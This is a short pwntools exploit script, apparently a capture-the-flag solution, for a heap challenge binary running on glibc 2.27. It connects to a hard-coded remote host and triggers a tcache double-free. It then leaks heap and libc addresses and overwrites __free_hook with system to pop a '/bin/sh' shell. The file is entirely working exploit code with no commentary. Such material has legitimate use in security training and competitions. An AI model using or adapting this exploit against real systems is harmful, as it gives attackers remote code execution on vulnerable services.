from pwn import*
def new(size,content):
	p.sendlineafter('choice:','1')
	p.sendlineafter('house:',str(size))
	p.sendafter('your house:',content)
def show(index):
	p.sendlineafter('choice:','3')
	p.sendlineafter('index:',str(index))
def free(index):
	p.sendlineafter('choice:','4')
	p.sendlineafter('index:',str(index))
p = process('./main')
p = remote('183.129.189.60',10060)
elf =ELF('./main')
libc = ELF('./libc-2.27.so',checksec=False)
new(0x10,'FMYY') #0
new(0x10,'FMYY') #1
new(0x10,'FMYY') #2
new(0x10,'FMYY') #3

#---------
free(2)
free(0)
free(0)
show(0)
p.recvuntil('house:\n')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x260
log.info('HEAP:\t'+ hex(heap_base))
new(0x10,p64(heap_base + 0x2A0))
new(0x20,'FMYY')
new(0x10,p64(elf.got['__libc_start_main']))
show(1)
p.recvuntil('house:\n')
libc_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
#------------
free(3)
free(3)
new(0x10,p64(free_hook))
new(0x20,'/bin/sh\x00')
new(0x10,p64(system))
free(8)
p.interactive()


